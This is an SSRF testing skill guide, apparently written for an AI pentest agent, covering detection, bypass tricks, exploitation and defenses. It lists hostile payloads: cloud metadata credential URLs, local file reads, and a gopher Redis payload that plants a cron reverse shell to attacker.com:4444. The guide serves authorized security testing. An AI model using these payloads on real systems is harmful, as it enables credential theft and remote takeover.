---
name: antifox-ssrf-testing
description: "驗證伺服器端請求偽造、URL 解析與目的位址限制（SSRF）。"
license: AGPL-3.0
---

改寫自 [AntiFox / ssrf-testing](https://github.com/AntiFox-AI/antifox/blob/070f798bf590667bc2a0a13c687dd87d8a4413bf/skills/ssrf-testing/SKILL.md)（AGPL-3.0）。原文與授權見 `${SKILL_DIR}/references/source.md`、`${SKILL_DIR}/references/LICENSE`。

## ARTEX 整合約定

1. 本文件提供方法與範例。先用目前可用的工具 schema、已核准範圍及實際環境決定步驟；範例的主機、帳號、回應與程式片段不是目前目標的事實。不要照抄範例中的廣域掃描、資料傾印、破壞、關閉 TLS 驗證或停用驗證設定。
2. 外部 CLI、商業產品、MCP 與 Python 套件均須另查是否已安裝、綁定及可執行。技能清單與工具相依索引不代表工具已就緒。沿用 ARTEX 現有代理、範圍與操作審批；載入技能不增加權限。
3. 可先用 `search_knowledge` 在目前可見技能中找相關段落，再用 `Skill` 載入完整程序。檢索結果是參考資料，不會解鎖 MCP，也不是漏洞證據。
4. 已確認的發現交給現有 `report_finding`；使用本次工具輸出的實際證據，保留前置條件、操作、預期結果與觀察結果。未確認的假設寫為 fact/hint，並標記不確定性。平台對話沒有任務上下文時，用現有任務交接工具。
5. HTTP 流量只使用已核實的引用，遵守目前的流量綁定開關及報告流程。`finding_id` 與 `finding_node_id` 是不同編號，依實際工具說明使用。無確切流量時保留文字與命令證據，不猜編號或為補證據重打目標。

# SSRF服务器端请求伪造测试

## 概述

SSRF（Server-Side Request Forgery）是一种利用服务器发起请求的漏洞，可以访问内网资源、进行端口扫描或绕过防火墙。本技能提供SSRF漏洞的检测、利用和防护方法。

## 漏洞原理

应用程序接受URL参数并请求该URL，攻击者可以控制请求的目标，导致：
- 内网资源访问
- 本地文件读取
- 端口扫描
- 绕过防火墙
- 云服务元数据访问

## 测试方法

### 1. 识别SSRF输入点

**常见功能：**
- URL预览/截图
- 文件上传（远程URL）
- Webhook回调
- API代理
- 数据导入
- 图片处理
- PDF生成

### 2. 基础检测

**测试本地回环：**
```
http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]
```

**测试内网IP：**
```
http://192.168.1.1
http://10.0.0.1
http://172.16.0.1
```

**测试文件协议：**
```
file:///etc/passwd
file:///C:/Windows/System32/drivers/etc/hosts
```

### 3. 绕过技术

**IP地址编码：**
```
127.0.0.1 → 2130706433 (十进制)
127.0.0.1 → 0x7f000001 (十六进制)
127.0.0.1 → 0177.0.0.1 (八进制)
```

**域名解析绕过：**
```
127.0.0.1.xip.io
127.0.0.1.nip.io
localtest.me
```

**URL重定向：**
```
http://attacker.com/redirect → http://127.0.0.1
```

**协议混淆：**
```
http://127.0.0.1:80@evil.com
http://evil.com#@127.0.0.1
```

## 利用技术

### 内网探测

**端口扫描：**
```bash
# 使用Burp Intruder
http://127.0.0.1:22
http://127.0.0.1:3306
http://127.0.0.1:6379
http://127.0.0.1:8080
http://127.0.0.1:9200
```

**识别服务：**
- 响应时间差异
- 错误信息
- HTTP状态码
- 响应内容

### 云服务元数据

**AWS EC2：**
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Google Cloud：**
```
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/
```

**Azure：**
```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01
```

**阿里云：**
```
http://100.100.100.200/latest/meta-data/
http://100.100.100.200/latest/meta-data/ram/security-credentials/
```

### 内网应用攻击

**访问管理后台：**
```
http://127.0.0.1:8080/admin
http://192.168.1.100/phpmyadmin
```

**Redis未授权访问：**
```
http://127.0.0.1:6379
# 然后发送Redis命令
```

**FastCGI攻击：**
```
http://127.0.0.1:9000
# 利用FastCGI协议执行命令
```

## 高级利用

### Gopher协议

**发送任意协议数据：**
```
gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aquit%0d%0a
```

**Redis命令执行：**
```
gopher://127.0.0.1:6379/_*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$57%0d%0a%0a%0a%0a*/1 * * * * bash -i >& /dev/tcp/attacker.com/4444 0>&1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a
```

### Dict协议

**端口扫描和信息收集：**
```
dict://127.0.0.1:6379/info
dict://127.0.0.1:3306/status
```

### 文件协议

**读取本地文件：**
```
file:///etc/passwd
file:///C:/Windows/System32/drivers/etc/hosts
file:///proc/self/environ
```

## 工具使用

### SSRFmap

```bash
# 基础扫描
python3 ssrfmap.py -r request.txt -p url

# 端口扫描
python3 ssrfmap.py -r request.txt -p url -m portscan

# 云元数据
python3 ssrfmap.py -r request.txt -p url -m cloud
```

### Gopherus

```bash
# 生成Gopher payload
python gopherus.py --exploit redis
```

### Burp Collaborator

**检测盲SSRF：**
```
http://burpcollaborator.net
# 观察是否有DNS/HTTP请求
```

## 验证和报告

### 验证步骤

1. 确认可以控制请求目标
2. 验证内网资源访问或端口扫描
3. 评估影响范围（内网渗透、数据泄露等）
4. 记录完整的POC
5. 通过 `report_finding` 工具将确认的漏洞录入平台（本平台记录漏洞的唯一入口），字段涵盖位置、类型、严重度、复现步骤/PoC 与修复建议

### 报告要点

- 漏洞位置和输入参数
- 可访问的内网资源或端口
- 完整的利用步骤和PoC
- 修复建议（URL白名单、禁用危险协议等）

## 防护措施

### 推荐方案

1. **URL白名单**
   ```python
   ALLOWED_DOMAINS = ['example.com', 'cdn.example.com']
   parsed = urlparse(url)
   if parsed.netloc not in ALLOWED_DOMAINS:
       raise ValueError("Domain not allowed")
   ```

2. **禁用危险协议**
   - 只允许http/https
   - 禁止file://、gopher://、dict://等

3. **IP地址过滤**
   ```python
   import ipaddress
   
   def is_internal_ip(ip):
       return ipaddress.ip_address(ip).is_private or \
              ipaddress.ip_address(ip).is_loopback
   ```

4. **使用DNS解析验证**
   - 解析域名获取IP
   - 验证IP是否在内网范围

5. **网络隔离**
   - 限制服务器出网权限
   - 使用代理服务器

## 注意事项

- 仅在授权测试环境中进行
- 避免对内网系统造成影响
- 注意不同协议的支持情况
- 测试时注意请求频率，避免触发防护
